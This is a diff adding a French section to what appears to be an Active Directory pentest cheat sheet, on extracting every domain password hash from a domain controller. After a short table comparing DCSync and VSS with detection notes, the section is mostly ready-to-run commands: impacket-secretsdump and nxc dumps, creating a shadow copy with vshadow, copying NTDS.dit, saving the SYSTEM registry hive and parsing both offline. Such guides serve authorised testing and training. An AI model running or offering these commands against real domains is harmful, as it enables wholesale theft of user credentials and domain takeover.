@@ -54,3 +54,48 @@ misc::cmd
 PsExec.exe \\DC1 cmd.exe
 ```
 
+## Shadow Copies (NTDS.dit)
+
+Deux méthodes pour extraire tous les hashes du domaine :
+
+| Méthode | Accès fichier | Protocole | Détection |
+|---|---|---|---|
+| **DCSync** (défaut) | Non — réseau uniquement | DRSUAPI (réplication AD) | Trafic de réplication depuis un non-DC suspect |
+| **VSS** (`-use-vss`) | Oui — snapshot disque | SMB + VSS | Création de shadow copy visible dans les logs |
+
+**Pourquoi VSS :** `NTDS.dit` est verrouillé en permanence par Windows tant que le DC tourne. VSS crée un snapshot frozen du disque — depuis ce snapshot, le fichier n'est plus verrouillé et peut être copié. `NTDS.dit` est chiffré avec une clé dans `HKLM\SYSTEM`, il faut donc exporter la ruche SYSTEM en même temps pour le déchiffrer offline.
+
+**Kali**
+
+```bash
+# VSS method — crée la shadow copy à distance et parse NTDS.dit
+impacket-secretsdump -use-vss corp.com/<DA_user>:<password>@<IP_DC>
+
+# ou via nxc
+nxc smb <IP_DC> -u <DA_user> -p <password> --ntds vss
+
+# Sans VSS — DCSync direct (plus rapide, pas de shadow copy)
+impacket-secretsdump corp.com/<DA_user>:<password>@<IP_DC>
+nxc smb <IP_DC> -u <DA_user> -p <password> --ntds
+```
+
+**Windows**
+
+```cmd
+:: Sur le DC — créer la shadow copy
+vshadow.exe -nw -p C:
+:: → noter le "Shadow copy device name" dans l'output
+
+:: Copier NTDS.dit depuis la shadow copy
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+:: Exporter la ruche SYSTEM
+reg.exe save hklm\system c:\system.bak
+```
+
+Transférer les deux fichiers sur Kali puis parser :
+
+```bash
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+
